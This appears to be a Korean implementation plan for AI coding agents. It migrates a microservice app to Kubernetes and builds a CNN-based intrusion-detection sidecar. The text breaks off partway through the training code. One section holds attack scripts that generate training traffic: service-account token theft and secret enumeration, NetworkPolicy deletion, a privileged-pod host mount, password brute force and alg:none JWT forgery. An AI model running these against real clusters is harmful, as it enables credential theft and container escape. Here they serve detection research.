# deepmesh × lightweight_servicemesh 통합 구현 계획

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** deepmesh MSA를 Kubernetes로 마이그레이션하고, KD-CNN 기반 침입 탐지 Sidecar Proxy(lightweight_servicemesh)를 각 서비스에 통합해 논문 Algorithm 1을 완전 구현한다.

**Architecture:** 각 Spring Boot 서비스 Pod에 Python Sidecar Proxy를 붙여 트래픽을 가로채고, 서비스별 Student CNN + OCSVM으로 이상 탐지 후 Drop/Relay/Forward를 수행한다. Control Plane(masterNode)이 ReplicaSet Pod IP 관리 및 Request Verifier 역할을 담당한다.

**Tech Stack:** Kubernetes, Spring Boot 3.5 / Java 17, Python 3.10, PyTorch 2.4.1 (CPU), scikit-learn OCSVM, aiohttp, uvloop, locust, tcpdump

## Global Constraints

- Kubernetes: master(4c/8G) + worker×3(12c/24G)
- 모든 서비스 `replicas: 2` (Relay 로직 동작 최소 요건)
- Proxy Container: 1 vCPU 제약 (논문 조건 동일)
- Student 모델: CNN-2x16 구성 (13.87K params)
- Proxy 포트: `9011` (기존 iptables.sh 기준)
- Control Plane API 포트: `8080`
- 네임스페이스: `deepmesh`
- 커밋 메시지: 한국어 한 줄 요약

---

## 파일 구조

```
deepmesh/
├── k8s/
│   ├── namespace.yaml
│   ├── secret.yaml
│   ├── configmap.yaml
│   ├── mysql/
│   │   ├── pvc.yaml
│   │   ├── statefulset.yaml
│   │   └── service.yaml
│   ├── auth-service/
│   │   ├── deployment.yaml
│   │   └── service.yaml
│   ├── post-service/
│   │   ├── deployment.yaml
│   │   └── service.yaml
│   ├── comment-service/
│   │   ├── deployment.yaml
│   │   └── service.yaml
│   ├── frontend/
│   │   ├── deployment.yaml
│   │   └── service.yaml
│   ├── ingress.yaml
│   └── control-plane/
│       ├── deployment.yaml
│       └── service.yaml
├── servicemesh/
│   ├── dataplane/
│   │   ├── Dockerfile
│   │   ├── requirements.txt
│   │   ├── iptables.sh
│   │   └── proxy/
│   │       ├── proxy_detection.py      ← Drop/Relay/Forward 완성
│   │       └── packet_parser_stack.c   ← lightweight_servicemesh에서 복사
│   └── controlplane/
│       ├── Dockerfile
│       ├── requirements.txt
│       ├── masterNode.py               ← 기존 코드 deepmesh용 수정
│       └── workerNode.py
├── data-collection/
│   ├── locust/
│   │   ├── auth_locustfile.py
│   │   ├── post_locustfile.py
│   │   └── comment_locustfile.py
│   ├── capture.sh
│   └── attack/
│       ├── k8s_enum.sh
│       ├── k8s_resource_manipulation.sh
│       ├── container_escape.sh
│       ├── brute_force.py
│       └── jwt_abuse.py
└── model-training/
    ├── preprocess_deepmesh.py
    ├── train_teacher.py
    ├── train_student_kd.py
    ├── train_ocsvm.py
    ├── export_torchscript.py
    └── evaluate.py
```

---

## Phase 1: deepmesh K8s 마이그레이션

### Task 1-1: Namespace, Secret, ConfigMap

**Files:**
- Create: `k8s/namespace.yaml`
- Create: `k8s/secret.yaml`
- Create: `k8s/configmap.yaml`

- [ ] **Step 1: namespace.yaml 작성**

```yaml
# k8s/namespace.yaml
apiVersion: v1
kind: Namespace
metadata:
  name: deepmesh
```

- [ ] **Step 2: secret.yaml 작성**

```yaml
# k8s/secret.yaml
apiVersion: v1
kind: Secret
metadata:
  name: deepmesh-secret
  namespace: deepmesh
type: Opaque
stringData:
  MYSQL_ROOT_PASSWORD: "your-password-here"
  JWT_SECRET: "your-jwt-secret-here"
```

- [ ] **Step 3: configmap.yaml 작성**

```yaml
# k8s/configmap.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: deepmesh-config
  namespace: deepmesh
data:
  AUTH_DB_URL: "jdbc:mysql://mysql-service:3306/auth_db?serverTimezone=Asia/Seoul&characterEncoding=UTF-8&createDatabaseIfNotExist=true"
  POSTS_DB_URL: "jdbc:mysql://mysql-service:3306/posts_db?serverTimezone=Asia/Seoul&characterEncoding=UTF-8&createDatabaseIfNotExist=true"
  COMMENTS_DB_URL: "jdbc:mysql://mysql-service:3306/comments_db?serverTimezone=Asia/Seoul&characterEncoding=UTF-8&createDatabaseIfNotExist=true"
  AUTH_SERVICE_URL: "http://auth-service:8080"
  POST_SERVICE_URL: "http://post-service:8080"
  COMMENT_SERVICE_URL: "http://comment-service:8080"
```

- [ ] **Step 4: 적용 및 확인**

```bash
kubectl apply -f k8s/namespace.yaml
kubectl apply -f k8s/secret.yaml
kubectl apply -f k8s/configmap.yaml
kubectl get namespace deepmesh
kubectl get secret deepmesh-secret -n deepmesh
kubectl get configmap deepmesh-config -n deepmesh
```
Expected: 3개 리소스 모두 Created

- [ ] **Step 5: 커밋**

```bash
git add k8s/namespace.yaml k8s/secret.yaml k8s/configmap.yaml
git commit -m "feat: deepmesh 네임스페이스, Secret, ConfigMap 추가"
```

---

### Task 1-2: MySQL StatefulSet

**Files:**
- Create: `k8s/mysql/pvc.yaml`
- Create: `k8s/mysql/statefulset.yaml`
- Create: `k8s/mysql/service.yaml`

- [ ] **Step 1: pvc.yaml 작성**

```yaml
# k8s/mysql/pvc.yaml
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: mysql-pvc
  namespace: deepmesh
spec:
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 5Gi
```

- [ ] **Step 2: statefulset.yaml 작성**

```yaml
# k8s/mysql/statefulset.yaml
apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: mysql
  namespace: deepmesh
spec:
  selector:
    matchLabels:
      app: mysql
  serviceName: mysql-service
  replicas: 1
  template:
    metadata:
      labels:
        app: mysql
    spec:
      containers:
        - name: mysql
          image: mysql:8.0
          env:
            - name: MYSQL_ROOT_PASSWORD
              valueFrom:
                secretKeyRef:
                  name: deepmesh-secret
                  key: MYSQL_ROOT_PASSWORD
            - name: MYSQL_DATABASE
              value: auth_db
          ports:
            - containerPort: 3306
          readinessProbe:
            exec:
              command:
                - sh
                - -c
                - "mysqladmin ping -h localhost -uroot -p$MYSQL_ROOT_PASSWORD"
            initialDelaySeconds: 10
            periodSeconds: 5
            failureThreshold: 20
          volumeMounts:
            - name: mysql-storage
              mountPath: /var/lib/mysql
      volumes:
        - name: mysql-storage
          persistentVolumeClaim:
            claimName: mysql-pvc
```

- [ ] **Step 3: service.yaml 작성**

```yaml
# k8s/mysql/service.yaml
apiVersion: v1
kind: Service
metadata:
  name: mysql-service
  namespace: deepmesh
spec:
  selector:
    app: mysql
  ports:
    - port: 3306
      targetPort: 3306
  clusterIP: None
```

- [ ] **Step 4: 적용 및 확인**

```bash
kubectl apply -f k8s/mysql/
kubectl wait --for=condition=ready pod -l app=mysql -n deepmesh --timeout=120s
kubectl exec -it mysql-0 -n deepmesh -- mysqladmin ping -uroot -p<password>
```
Expected: `mysqld is alive`

- [ ] **Step 5: 커밋**

```bash
git add k8s/mysql/
git commit -m "feat: MySQL StatefulSet, PVC, Service 매니페스트 추가"
```

---

### Task 1-3: Spring Boot 서비스 Deployment (auth / post / comment)

**Files:**
- Create: `k8s/auth-service/deployment.yaml`
- Create: `k8s/auth-service/service.yaml`
- Create: `k8s/post-service/deployment.yaml`
- Create: `k8s/post-service/service.yaml`
- Create: `k8s/comment-service/deployment.yaml`
- Create: `k8s/comment-service/service.yaml`

> 세 서비스 모두 구조가 동일하므로 auth-service를 기준으로 작성하고 나머지는 이름과 DB URL만 변경한다.

- [ ] **Step 1: auth-service deployment.yaml 작성**

```yaml
# k8s/auth-service/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: auth-service
  namespace: deepmesh
spec:
  replicas: 2
  selector:
    matchLabels:
      app: auth-service
  template:
    metadata:
      labels:
        app: auth-service
    spec:
      containers:
        - name: auth-service
          image: <REGISTRY>/auth-service:latest   # 실제 레지스트리 주소로 변경
          ports:
            - containerPort: 8080
          env:
            - name: SPRING_DATASOURCE_URL
              valueFrom:
                configMapKeyRef:
                  name: deepmesh-config
                  key: AUTH_DB_URL
            - name: SPRING_DATASOURCE_USERNAME
              value: root
            - name: SPRING_DATASOURCE_PASSWORD
              valueFrom:
                secretKeyRef:
                  name: deepmesh-secret
                  key: MYSQL_ROOT_PASSWORD
            - name: JWT_SECRET
              valueFrom:
                secretKeyRef:
                  name: deepmesh-secret
                  key: JWT_SECRET
            - name: SPRING_JPA_HIBERNATE_DDL_AUTO
              value: update
          readinessProbe:
            httpGet:
              path: /actuator/health
              port: 8080
            initialDelaySeconds: 30
            periodSeconds: 10
```

- [ ] **Step 2: auth-service service.yaml 작성**

```yaml
# k8s/auth-service/service.yaml
apiVersion: v1
kind: Service
metadata:
  name: auth-service
  namespace: deepmesh
spec:
  selector:
    app: auth-service
  ports:
    - port: 8080
      targetPort: 8080
```

- [ ] **Step 3: post-service, comment-service 동일 구조로 작성**

`k8s/post-service/deployment.yaml` — `app: post-service`, DB URL: `POSTS_DB_URL`  
`k8s/comment-service/deployment.yaml` — `app: comment-service`, DB URL: `COMMENTS_DB_URL`  
각각 service.yaml도 동일 패턴으로 작성.

- [ ] **Step 4: 적용 및 확인**

```bash
kubectl apply -f k8s/auth-service/
kubectl apply -f k8s/post-service/
kubectl apply -f k8s/comment-service/
kubectl wait --for=condition=ready pod -l app=auth-service -n deepmesh --timeout=120s
kubectl get pods -n deepmesh
```
Expected: auth-service-xxx (2/2 Running) × 2, post/comment 동일

- [ ] **Step 5: API 동작 확인**

```bash
# auth-service 로그인 테스트 (ClusterIP 내부 접근)
kubectl run curl-test --image=curlimages/curl -it --rm -n deepmesh -- \
  curl -X POST http://auth-service:8080/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"test","password":"test"}'
```
Expected: HTTP 200 또는 401 (서버 응답 자체가 확인 목표)

- [ ] **Step 6: 커밋**

```bash
git add k8s/auth-service/ k8s/post-service/ k8s/comment-service/
git commit -m "feat: auth/post/comment 서비스 Deployment, Service 매니페스트 추가"
```

---

### Task 1-4: Frontend + Ingress

**Files:**
- Create: `k8s/frontend/deployment.yaml`
- Create: `k8s/frontend/service.yaml`
- Create: `k8s/ingress.yaml`

- [ ] **Step 1: frontend deployment.yaml 작성**

```yaml
# k8s/frontend/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: frontend
  namespace: deepmesh
spec:
  replicas: 2
  selector:
    matchLabels:
      app: frontend
  template:
    metadata:
      labels:
        app: frontend
    spec:
      containers:
        - name: frontend
          image: <REGISTRY>/frontend:latest
          ports:
            - containerPort: 80
          env:
            - name: VITE_AUTH_API_URL
              valueFrom:
                configMapKeyRef:
                  name: deepmesh-config
                  key: AUTH_SERVICE_URL
```

- [ ] **Step 2: frontend service.yaml 작성**

```yaml
# k8s/frontend/service.yaml
apiVersion: v1
kind: Service
metadata:
  name: frontend-service
  namespace: deepmesh
spec:
  selector:
    app: frontend
  ports:
    - port: 80
      targetPort: 80
  type: LoadBalancer
```

- [ ] **Step 3: ingress.yaml 작성**

```yaml
# k8s/ingress.yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: deepmesh-ingress
  namespace: deepmesh
spec:
  rules:
    - http:
        paths:
          - path: /api/auth
            pathType: Prefix
            backend:
              service:
                name: auth-service
                port:
                  number: 8080
          - path: /api/posts
            pathType: Prefix
            backend:
              service:
                name: post-service
                port:
                  number: 8080
          - path: /api/comments
            pathType: Prefix
            backend:
              service:
                name: comment-service
                port:
                  number: 8080
          - path: /
            pathType: Prefix
            backend:
              service:
                name: frontend-service
                port:
                  number: 80
```

- [ ] **Step 4: 적용 및 전체 Pod 상태 확인**

```bash
kubectl apply -f k8s/frontend/
kubectl apply -f k8s/ingress.yaml
kubectl get pods -n deepmesh
kubectl get ingress -n deepmesh
```
Expected: 전체 Pod Running, Ingress ADDRESS 할당

- [ ] **Step 5: Phase 1 통합 테스트**

```bash
# 외부에서 회원가입 → 로그인 → 게시글 작성 → 댓글 작성 흐름 확인
INGRESS_IP=$(kubectl get ingress deepmesh-ingress -n deepmesh -o jsonpath='{.status.loadBalancer.ingress[0].ip}')
curl -X POST http://$INGRESS_IP/api/auth/signup -H 'Content-Type: application/json' \
  -d '{"username":"testuser","password":"test1234","email":"test@test.com"}'
```
Expected: HTTP 201

- [ ] **Step 6: 커밋**

```bash
git add k8s/frontend/ k8s/ingress.yaml
git commit -m "feat: 프론트엔드 Deployment, LoadBalancer, Ingress 매니페스트 추가"
```

---

## Phase 2: 데이터 수집 파이프라인

### Task 2-1: Benign 트래픽 생성 스크립트 (locust)

**Files:**
- Create: `data-collection/locust/auth_locustfile.py`
- Create: `data-collection/locust/post_locustfile.py`
- Create: `data-collection/locust/comment_locustfile.py`

- [ ] **Step 1: auth_locustfile.py 작성**

```python
# data-collection/locust/auth_locustfile.py
from locust import HttpUser, task, between
import random, string

def rand_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase, k=n))

class AuthUser(HttpUser):
    wait_time = between(0.5, 2)
    token = None

    def on_start(self):
        username = rand_str()
        password = rand_str(12)
        self.client.post("/api/auth/signup", json={
            "username": username, "password": password, "email": f"{username}@test.com"
        })
        resp = self.client.post("/api/auth/login", json={
            "username": username, "password": password
        })
        if resp.status_code == 200:
            self.token = resp.json().get("accessToken")

    @task(3)
    def login(self):
        self.client.post("/api/auth/login", json={
            "username": rand_str(), "password": rand_str(12)
        })

    @task(1)
    def refresh(self):
        if self.token:
            self.client.post("/api/auth/refresh",
                headers={"Authorization": f"Bearer {self.token}"})
```

- [ ] **Step 2: post_locustfile.py 작성**

```python
# data-collection/locust/post_locustfile.py
from locust import HttpUser, task, between
import random

class PostUser(HttpUser):
    wait_time = between(0.5, 2)
    token = None
    post_ids = []

    def on_start(self):
        # auth-service에서 토큰 발급
        resp = self.client.post(
            "http://auth-service:8080/api/auth/login",
            json={"username": "testuser", "password": "test1234"}
        )
        if resp.status_code == 200:
            self.token = resp.json().get("accessToken")

    def auth_header(self):
        return {"Authorization": f"Bearer {self.token}"} if self.token else {}

    @task(3)
    def list_posts(self):
        self.client.get("/api/posts", headers=self.auth_header())

    @task(2)
    def create_post(self):
        resp = self.client.post("/api/posts",
            json={"title": f"title-{random.randint(1,9999)}",
                  "content": "benign content"},
            headers=self.auth_header())
        if resp.status_code == 201:
            self.post_ids.append(resp.json().get("id"))

    @task(1)
    def get_post(self):
        if self.post_ids:
            pid = random.choice(self.post_ids)
            self.client.get(f"/api/posts/{pid}", headers=self.auth_header())
```

- [ ] **Step 3: comment_locustfile.py 작성**

```python
# data-collection/locust/comment_locustfile.py
from locust import HttpUser, task, between
import random

class CommentUser(HttpUser):
    wait_time = between(0.5, 2)
    token = None
    post_ids = [1, 2, 3, 4, 5]  # 사전에 생성된 게시글 ID

    def on_start(self):
        resp = self.client.post(
            "http://auth-service:8080/api/auth/login",
            json={"username": "testuser", "password": "test1234"}
        )
        if resp.status_code == 200:
            self.token = resp.json().get("accessToken")

    def auth_header(self):
        return {"Authorization": f"Bearer {self.token}"} if self.token else {}

    @task(3)
    def list_comments(self):
        pid = random.choice(self.post_ids)
        self.client.get(f"/api/comments?postId={pid}", headers=self.auth_header())

    @task(2)
    def create_comment(self):
        pid = random.choice(self.post_ids)
        self.client.post("/api/comments",
            json={"postId": pid, "content": f"comment-{random.randint(1,9999)}"},
            headers=self.auth_header())
```

- [ ] **Step 4: locust 실행 확인**

```bash
pip install locust
# auth-service 대상 10명, 1분 실행
locust -f data-collection/locust/auth_locustfile.py \
  --host http://<INGRESS_IP> \
  --users 10 --spawn-rate 2 --run-time 60s --headless
```
Expected: Failure rate 0%, RPS > 0

- [ ] **Step 5: 커밋**

```bash
git add data-collection/locust/
git commit -m "feat: 서비스별 Benign 트래픽 생성 locust 스크립트 추가"
```

---

### Task 2-2: tcpdump 캡처 스크립트

**Files:**
- Create: `data-collection/capture.sh`

- [ ] **Step 1: capture.sh 작성**

```bash
#!/bin/bash
# data-collection/capture.sh
# 사용법: ./capture.sh <service-name> <duration-sec>
# 예: ./capture.sh auth-service 300

SERVICE=$1
DURATION=${2:-300}
NAMESPACE="deepmesh"
OUTPUT_DIR="./pcap"
mkdir -p $OUTPUT_DIR

echo "[*] $SERVICE Pod 목록 조회..."
PODS=$(kubectl get pods -n $NAMESPACE -l app=$SERVICE -o jsonpath='{.items[*].metadata.name}')

for POD in $PODS; do
  echo "[*] $POD 캡처 시작 (${DURATION}s)..."
  kubectl exec -n $NAMESPACE $POD -c $SERVICE -- \
    sh -c "apt-get install -y tcpdump -qq && \
           tcpdump -i eth0 -w /tmp/capture_${POD}.pcap &
           sleep ${DURATION} &&
           kill \$(pgrep tcpdump)" &
done

wait
echo "[*] 캡처 완료. 파일 수집 중..."

for POD in $PODS; do
  kubectl cp $NAMESPACE/$POD:/tmp/capture_${POD}.pcap \
    $OUTPUT_DIR/${SERVICE}_${POD}.pcap -c $SERVICE
  echo "[+] $OUTPUT_DIR/${SERVICE}_${POD}.pcap 저장 완료"
done
```

- [ ] **Step 2: 실행 권한 부여 및 테스트**

```bash
chmod +x data-collection/capture.sh
# locust와 동시에 실행
./data-collection/capture.sh auth-service 60
ls -lh ./pcap/
```
Expected: `auth-service_*.pcap` 파일 생성, 크기 > 0

- [ ] **Step 3: 커밋**

```bash
git add data-collection/capture.sh
git commit -m "feat: 서비스별 tcpdump 패킷 캡처 스크립트 추가"
```

---

### Task 2-3: 공격 시나리오 스크립트

**Files:**
- Create: `data-collection/attack/k8s_enum.sh`
- Create: `data-collection/attack/k8s_resource_manipulation.sh`
- Create: `data-collection/attack/container_escape.sh`
- Create: `data-collection/attack/brute_force.py`
- Create: `data-collection/attack/jwt_abuse.py`

> **주의**: 아래 스크립트는 격리된 테스트 클러스터에서만 실행한다.

- [ ] **Step 1: k8s_enum.sh 작성 (T1589, T1528, T1613)**

```bash
#!/bin/bash
# data-collection/attack/k8s_enum.sh
# 취약한 Pod에서 ServiceAccount 토큰으로 K8s API 열거

TARGET_POD=${1:-"auth-service-0"}
NAMESPACE="deepmesh"

echo "[*] ServiceAccount 토큰 추출..."
TOKEN=$(kubectl exec -n $NAMESPACE $TARGET_POD -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token)

APISERVER="https://$(kubectl get svc kubernetes -o jsonpath='{.spec.clusterIP}'):443"

echo "[*] Pod 목록 열거 (T1589)..."
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/pods

echo "[*] Secret 열거 (T1528)..."
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/secrets

echo "[*] ConfigMap 열거 (T1613)..."
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/configmaps
```

- [ ] **Step 2: brute_force.py 작성 (T1595, T1110)**

```python
#!/usr/bin/env python3
# data-collection/attack/brute_force.py
import requests, itertools, string, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/api/auth/login"
USERNAME = "admin"
PASSWORDS = ["admin", "password", "123456", "test1234", "secret",
             "admin123", "pass", "qwerty", "letmein", "welcome"]

print(f"[*] Brute-force: {TARGET}")
for pwd in PASSWORDS:
    try:
        resp = requests.post(TARGET,
            json={"username": USERNAME, "password": pwd},
            timeout=3)
        print(f"  [{resp.status_code}] password={pwd}")
        if resp.status_code == 200:
            print(f"[+] 성공: {pwd}")
            break
    except Exception as e:
        print(f"  [!] 오류: {e}")
```

- [ ] **Step 3: jwt_abuse.py 작성 (T1219)**

```python
#!/usr/bin/env python3
# data-collection/attack/jwt_abuse.py
# JWT 위조 시도: 알고리즘 none, 만료 토큰 재사용
import requests, base64, json, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/api/posts"

def b64pad(s):
    return s + '=' * (-len(s) % 4)

# 알고리즘 none 공격
header = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(
    json.dumps({"sub": "admin", "roles": ["ADMIN"]}).encode()
).rstrip(b'=').decode()
fake_token = f"{header}.{payload}."

print(f"[*] alg:none JWT 시도...")
resp = requests.get(TARGET,
    headers={"Authorization": f"Bearer {fake_token}"}, timeout=3)
print(f"  [{resp.status_code}]")

# 만료 토큰 재사용 (임의 토큰)
expired = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiZXhwIjoxfQ.invalid"
print(f"[*] 만료 토큰 재사용 시도...")
resp = requests.get(TARGET,
    headers={"Authorization": f"Bearer {expired}"}, timeout=3)
print(f"  [{resp.status_code}]")
```

- [ ] **Step 4: k8s_resource_manipulation.sh 작성 (T1609)**

```bash
#!/bin/bash
# data-collection/attack/k8s_resource_manipulation.sh
# NetworkPolicy 변조로 서비스 간 격리 우회 시도
NAMESPACE="deepmesh"
TOKEN=$(kubectl exec -n $NAMESPACE auth-service-0 -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://$(kubectl get svc kubernetes -o jsonpath='{.spec.clusterIP}'):443"

echo "[*] NetworkPolicy 삭제 시도 (T1609)..."
curl -sk -X DELETE -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/networking.k8s.io/v1/namespaces/$NAMESPACE/networkpolicies/default-deny
```

- [ ] **Step 5: container_escape.sh 작성 (T1610, T1611)**

```bash
#!/bin/bash
# data-collection/attack/container_escape.sh
# privileged 컨테이너 탈출 시뮬레이션
NAMESPACE="deepmesh"
echo "[*] 테스트용 privileged Pod 생성..."
kubectl run escape-test -n $NAMESPACE \
  --image=ubuntu:20.04 \
  --overrides='{"spec":{"containers":[{"name":"escape","image":"ubuntu:20.04","command":["sleep","3600"],"securityContext":{"privileged":true}}]}}' \
  --restart=Never

sleep 5
echo "[*] 호스트 파일시스템 접근 시도 (T1611)..."
kubectl exec -n $NAMESPACE escape-test -- \
  sh -c "mkdir -p /mnt/host && mount /dev/sda1 /mnt/host 2>/dev/null; ls /mnt/host || echo 'mount failed (expected in test)'"

echo "[*] 테스트 Pod 삭제..."
kubectl delete pod escape-test -n $NAMESPACE
```

- [ ] **Step 6: 커밋**

```bash
git add data-collection/attack/
git commit -m "feat: MITRE ATT&CK 기반 공격 시나리오 스크립트 추가"
```

---

## Phase 3: 서비스별 모델 학습 (GPU 서버)

### Task 3-1: deepmesh용 전처리 스크립트

**Files:**
- Create: `model-training/preprocess_deepmesh.py`

- [ ] **Step 1: preprocess_deepmesh.py 작성**

```python
# model-training/preprocess_deepmesh.py
"""
.pcap 파일을 5×1479 그레이스케일 이미지 시퀀스로 변환.
논문 Traffic Converter와 동일한 변환 적용.
"""
import struct, os, sys
import numpy as np
from scapy.all import rdpcap, Raw, IP, TCP, UDP

VEC_LEN = 1479   # 19-byte header + 1460-byte payload
WIN_SIZE = 5
HEADER_LEN = 19

def packet_to_vec(pkt):
    """패킷 → 1479-byte 벡터 (IP 고정 필드 + payload)"""
    vec = np.zeros(VEC_LEN, dtype=np.uint8)
    raw = bytes(pkt)
    # 19-byte 헤더: protocol(1) + src_port(2) + dst_port(2) + flags(1) + ... 나머지 0
    if IP in pkt:
        vec[0] = pkt[IP].proto
    if TCP in pkt:
        vec[1:3] = struct.pack('!H', pkt[TCP].sport)
        vec[3:5] = struct.pack('!H', pkt[TCP].dport)
        vec[5] = pkt[TCP].flags
    elif UDP in pkt:
        vec[1:3] = struct.pack('!H', pkt[UDP].sport)
        vec[3:5] = struct.pack('!H', pkt[UDP].dport)
    # payload: raw bytes (최대 1460)
    payload = bytes(pkt[Raw]) if Raw in pkt else b''
    payload = payload[:1460]
    vec[HEADER_LEN:HEADER_LEN + len(payload)] = list(payload)
    return vec

def pcap_to_sequences(pcap_path, label=0):
    """pcap → (N, WIN_SIZE, VEC_LEN) 배열 + 레이블"""
    pkts = rdpcap(pcap_path)
    # 세션 단위로 그룹화 (src_ip, dst_ip, src_port, dst_port)
    sessions = {}
    for pkt in pkts:
        if not (IP in pkt and (TCP in pkt or UDP in pkt)):
            continue
        key = (pkt[IP].src, pkt[IP].dst,
               pkt[TCP].sport if TCP in pkt else pkt[UDP].sport,
               pkt[TCP].dport if TCP in pkt else pkt[UDP].dport)
        sessions.setdefault(key, []).append(packet_to_vec(pkt))

    sequences, labels = [], []
    for vecs in sessions.values():
        for i in range(len(vecs) - WIN_SIZE + 1):
            seq = np.stack(vecs[i:i + WIN_SIZE])  # (5, 1479)
            sequences.append(seq)
            labels.append(label)
    return np.array(sequences, dtype=np.float32) / 255.0, np.array(labels)

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--benign', required=True)
    parser.add_argument('--attack', default=None)
    parser.add_argument('--out', required=True)
    args = parser.parse_args()

    print(f"[*] Benign 처리: {args.benign}")
    X_b, y_b = pcap_to_sequences(args.benign, label=0)
    print(f"    → {X_b.shape}")

    if args.attack:
        print(f"[*] Attack 처리: {args.attack}")
        X_a, y_a = pcap_to_sequences(args.attack, label=1)
        print(f"    → {X_a.shape}")
        X = np.concatenate([X_b, X_a])
        y = np.concatenate([y_b, y_a])
    else:
        X, y = X_b, y_b

    os.makedirs(args.out, exist_ok=True)
    np.save(os.path.join(args.out, 'X.npy'), X)
    np.save(os.path.join(args.out, 'y.npy'), y)
    print(f"[+] 저장 완료: {args.out}/X.npy ({X.shape}), y.npy")
```

- [ ] **Step 2: 실행 확인**

```bash
pip install scapy numpy
python model-training/preprocess_deepmesh.py \
  --benign ./pcap/auth-service_auth-service-xxx.pcap \
  --out ./data/auth-service/
ls ./data/auth-service/
```
Expected: `X.npy`, `y.npy` 생성

- [ ] **Step 3: 커밋**

```bash
git add model-training/preprocess_deepmesh.py
git commit -m "feat: deepmesh pcap 전처리 스크립트 추가 (5×1479 시퀀스 변환)"
```

---

### Task 3-2: Teacher 모델 학습

**Files:**
- Create: `model-training/train_teacher.py`

- [ ] **Step 1: train_teacher.py 작성**

```python
# model-training/train_teacher.py
"""
NT-Xent Contrastive Learning으로 Teacher CNN 인코더 학습.
정상 트래픽만 사용 (label=0).
"""
import os, argparse
import numpy as np
import torch
import torch.nn as nn
import torch.nn.functional as F
from torch.utils.data import DataLoader, TensorDataset

class TeacherEncoder(nn.Module):
    def __init__(self, feat_dim=128):
        super().__init__()
        self.conv = nn.Sequential(
            nn.Conv2d(1, 64, kernel_size=(3, 3), padding=1), nn.ReLU(),
            nn.Conv2d(64, 64, kernel_size=(3, 3), padding=1), nn.ReLU(),
            nn.AdaptiveAvgPool2d((4, 4)),
        )
        self.fc = nn.Linear(64 * 4 * 4, feat_dim)

    def forward(self, x):
        h = self.conv(x)
        h = h.view(h.size(0), -1)
        return F.normalize(self.fc(h), dim=1)

def nt_xent_loss(z, tau=0.1):
    N = z.size(0) // 2
    z = F.normalize(z, dim=1)
    sim = torch.mm(z, z.T) / tau
    mask = torch.eye(2 * N, dtype=torch.bool, device=z.device)
    sim.masked_fill_(mask, float('-inf'))
    labels = torch.cat([torch.arange(N, 2*N), torch.arange(N)]).to(z.device)
    return F.cross_entropy(sim, labels)

def add_noise(x, sigma=0.01):
    return torch.clamp(x + sigma * torch.randn_like(x), 0, 1)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--data', required=True, help='전처리된 데이터 디렉토리')
    parser.add_argument('--out', required=True, help='모델 저장 경로')
    parser.add_argument('--epochs', type=int, default=50)
    parser.add_argument('--batch', type=int, default=64)
    parser.add_argument('--lr', type=float, default=1e-3)
    args = parser.parse_args()

    X = np.load(os.path.join(args.data, 'X.npy'))
    y = np.load(os.path.join(args.data, 'y.npy'))
    X_benign = X[y == 0]  # 정상만 사용

    # (N, 5, 1479) → (N, 1, 1479, 5)
    X_t = torch.from_numpy(X_benign).permute(0, 2, 1).unsqueeze(1)
    loader = DataLoader(TensorDataset(X_t), batch_size=args.batch, shuffle=True)

    device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
    model = TeacherEncoder().to(device)
    opt = torch.optim.Adam(model.parameters(), lr=args.lr)

    for epoch in range(args.epochs):
        total_loss = 0
        for (x,) in loader:
            x = x.to(device)
            x1, x2 = add_noise(x), add_noise(x)
            z = model(torch.cat([x1, x2]))
            loss = nt_xent_loss(z)
            opt.zero_grad(); loss.backward(); opt.step()
            total_loss += loss.item()
        print(f"Epoch {epoch+1}/{args.epochs} loss={total_loss/len(loader):.4f}")

    os.makedirs(args.out, exist_ok=True)
    torch.save(model.state_dict(), os.path.join(args.out, 'teacher.pth'))
    print(f"[+] Teacher 저장: {args.out}/teacher.pth")
```

- [ ] **Step 2: GPU 서버에서 실행**

```bash
# auth-service Teacher 학습
python model-training/train_teacher.py \
  --data ./data/auth-service/ \
  --out ./models/auth-service/ \
  --epochs 50

# post-service, comment-service 동일하게 실행
python model-training/train_teacher.py --data ./data/post-service/ --out ./models/post-service/ --epochs 50
python model-training/train_teacher.py --data ./data/comment-service/ --out ./models/comment-service/ --epochs 50
```
Expected: 각 `teacher.pth` 생성, loss 수렴 확인

- [ ] **Step 3: 커밋**

```bash
git add model-training/train_teacher.py
git commit -m "feat: NT-Xent 기반 Teacher CNN 인코더 학습 스크립트 추가"
```

---

### Task 3-3: Student KD 학습 + OCSVM + TorchScript 변환

**Files:**
- Create: `model-training/train_student_kd.py`
- Create: `model-training/train_ocsvm.py`
- Create: `model-training/export_torchscript.py`

- [ ] **Step 1: train_student_kd.py 작성**

```python
# model-training/train_student_kd.py
"""
CNN-2x16 Student 모델을 Teacher로부터 KD (MSE Loss).
"""
import os, argparse
import numpy as np
import torch
import torch.nn as nn
import torch.nn.functional as F
from torch.utils.data import DataLoader, TensorDataset
from train_teacher import TeacherEncoder  # 같은 디렉토리

class StudentEncoder(nn.Module):
